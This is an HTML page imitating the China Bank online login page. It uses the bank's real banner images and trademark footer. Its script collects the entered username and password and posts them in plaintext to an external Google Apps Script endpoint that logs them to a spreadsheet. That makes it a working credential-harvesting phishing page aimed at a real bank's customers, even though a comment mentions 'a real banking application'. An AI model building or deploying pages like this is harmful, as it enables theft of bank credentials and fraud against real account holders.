<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login Page - China Bank</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #F3F3F4;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    .logo {
      align-self: flex-start;
      margin-left: 300px;
      margin-bottom: 20px;
    }

    .logo img {
      width: 150px;
      height: auto;
    }

    .container {
      display: flex;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      background-color: white;
      width: 997px;
    }

    .login-section {
      width: 25%;
      min-width: 200px;
      background: linear-gradient(to bottom, #e60000, #990000);
      color: white;
      padding: 20px;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    .login-section h2 {
      font-size: 16px;
      margin-bottom: 10px;
    }

    .login-section input {
      padding: 5px;
      margin-bottom: 10px;
      width: 100%;
      border: none;
      border-radius: 4px;
      font-size: 12px;
    }

    .login-section a {
      color: white;
      font-size: 10px;
      text-decoration: underline;
      margin-bottom: 10px;
      cursor: pointer;
    }

    .login-section button {
      padding: 8px;
      width: 100%;
      background: #333;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 12px;
      font-weight: bold;
      cursor: pointer;
    }

    .carousel-section {
      position: relative;
      overflow: hidden;
      width: 748px;
      height: 268px;
      background: black;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .carousel-section img {
      width: 748px;
      height: 268px;
      object-fit: contain;
      position: absolute;
      top: 0;
      left: 0;
      opacity: 0;
      transition: opacity 1s ease-in-out;
    }

    .carousel-section img.active {
      opacity: 1;
      position: relative;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #666;
    }
    
    /* Status message styling */
    .status-message {
      padding: 8px;
      margin-top: 10px;
      font-size: 11px;
      border-radius: 3px;
      text-align: center;
      display: none;
    }
    
    .status-success {
      background-color: #d4edda;
      color: #155724;
      display: block;
    }
    
    .status-error {
      background-color: #f8d7da;
      color: #721c24;
      display: block;
    }
  </style>
</head>
<body>
  <div class="logo">
    <img src="cbanklogo.png" alt="Logo">
  </div>

  <div class="container">
    <div class="login-section">
      <h2>Login to your Account</h2>
      <input type="text" id="username" placeholder="Username" />
      <input type="password" id="password" placeholder="Password" />
      <a onclick="forgotPassword()">Forgot password? Click here.</a>
      <button onclick="submitLogin()">Login</button>
      <div id="statusMessage" class="status-message"></div>
    </div>

    <div class="carousel-section">
      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%201.png" alt="Slide 1" class="active" />
      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%202.png" alt="Slide 2" />
      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%203.png" alt="Slide 3" />
    </div>
  </div>

  <div class="footer">
   Supported Browsers 
   <img src="https://cbconline.chinabank.ph/CBC/corp/L001/consumer/images//CBC/safari.png?mtime=1457399659000" alt="Safari"> 
   <img src="https://cbconline.chinabank.ph/CBC/corp/L001/consumer/images//CBC/chrome.png?mtime=1457399659000" alt="Chrome"> 
   <img src="https://cbconline.chinabank.ph/CBC/corp/L001/consumer/images//CBC/ie.png?mtime=1457399659000" alt="Internet Explorer"> 
   <img src="https://cbconline.chinabank.ph/CBC/corp/L001/consumer/images//CBC/mozilla.png?mtime=1457399659000" alt="Firefox">  
    China Bank Online is a registered trademark of China Banking Corporation. 2010 (TM)
  </div>

  <script>
    // Carousel functionality
    const images = document.querySelectorAll('.carousel-section img');
    let currentIndex = 0;

    setInterval(() => {
      images[currentIndex].classList.remove('active');
      currentIndex = (currentIndex + 1) % images.length;
      images[currentIndex].classList.add('active');
    }, 6000);

    // Login form submission to Google Sheets
    async function submitLogin() {
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const statusMessage = document.getElementById('statusMessage');
      
      // Clear previous messages
      statusMessage.className = 'status-message';
      statusMessage.textContent = '';
      
      // Validate inputs
      if (!username || !password) {
        statusMessage.textContent = 'Please enter both username and password';
        statusMessage.classList.add('status-error');
        return;
      }
      
      try {
        // Show loading state
        statusMessage.textContent = 'Logging in...';
        statusMessage.classList.add('status-success');
        
        // Prepare data for Google Sheets
        const data = {
          timestamp: new Date().toISOString(),
          username: username,
          password: password,
          source: 'China Bank Login Page'
        };
        
        // Send data to Google Sheets
        const response = await sendToGoogleSheets(data);
        
        // Show success message
        statusMessage.textContent = 'Login successful! Data sent to Google Sheets.';
        statusMessage.classList.add('status-success');
        
        // Clear form
        document.getElementById('username').value = '';
        document.getElementById('password').value = '';
        
        // In a real banking application, you would redirect to dashboard
        // setTimeout(() => { window.location.href = 'dashboard.html'; }, 1500);
        
      } catch (error) {
        console.error('Error:', error);
        statusMessage.textContent = 'Error: ' + error.message;
        statusMessage.classList.add('status-error');
      }
    }

    function forgotPassword() {
      alert('For security reasons, please contact our customer support at 1-800-CHINA-BANK (244-6222) to reset your password.');
    }
    
    // Google Sheets Integration
    async function sendToGoogleSheets(data) {
      // Your Google Apps Script URL
      const scriptURL = 'https://script.google.com/macros/s/AKfycbxIyaBVen2Lo-OsO3soq0uuNov8sUZEO42IUIGQvvKGU4r6tk9tugwRi3rl--eZucrX/exec';
      
      try {
        const response = await fetch(scriptURL, {
          method: 'POST',
          body: JSON.stringify(data),
          headers: {
            'Content-Type': 'application/json'
          }
        });
        
        if (!response.ok) {
          throw new Error('Failed to connect to Google Sheets');
        }
        
        return await response.json();
      } catch (error) {
        throw new Error('Could not connect to the server. Please try again later.');
      }
    }
  </script>
</body>
</html>
